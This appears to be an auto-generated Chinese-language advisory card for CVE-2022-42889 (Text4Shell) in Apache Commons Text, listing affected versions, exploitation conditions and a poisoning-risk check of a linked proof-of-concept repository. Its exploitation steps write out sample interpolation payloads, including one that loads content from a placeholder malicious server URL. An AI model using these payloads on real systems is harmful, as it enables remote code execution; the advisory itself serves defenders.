## CVE-2022-42889: Apache Commons Text RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响版本的 Apache Commons Text，并且允许用户可控的字符串进行变量插值。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-42889 漏洞是 Apache Commons Text 库中一个远程代码执行漏洞，存在于 1.5 到 1.9 版本中。该漏洞源于库中存在不安全的默认变量插值配置，允许攻击者通过 `${prefix:name}` 格式的字符串执行任意代码或与远程服务器交互。其中，`prefix` 用于定位执行插值的 `org.apache.commons.text.lookup.StringLookup` 实例。存在风险的 `prefix` 包括 `script` (执行 JVM 脚本), `dns` (解析 DNS 记录), 和 `url` (从 URL 加载值)。

**有效性：**
根据漏洞描述、搜索结果和漏洞利用方式，该漏洞利用是有效的。搜索结果中多个链接表明该漏洞（又名 Text4Shell）是一个严重的安全问题，允许远程代码执行。

**投毒风险：**
提供的代码片段是 Apache License 的许可证文本，不包含任何可执行代码，因此不存在投毒风险。投毒风险评估为 0%。

**利用方式：**
1.  应用程序使用 Apache Commons Text 1.5 到 1.9 版本。
2.  应用程序接受用户提供的字符串，并使用该字符串进行变量插值，没有进行充分的过滤或安全处理。
3.  攻击者构造包含恶意 `prefix` 的字符串，例如 `${script:javascript code}` 或 `${url:http://malicious-server/evil.txt}`。
4.  Apache Commons Text 解析该字符串，并执行相应的操作，例如执行 JavaScript 代码或从恶意 URL 加载内容，从而导致远程代码执行或信息泄露。

**项目地址:** [QAInsights/cve-2022-42889-jmeter](https://github.com/QAInsights/cve-2022-42889-jmeter)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)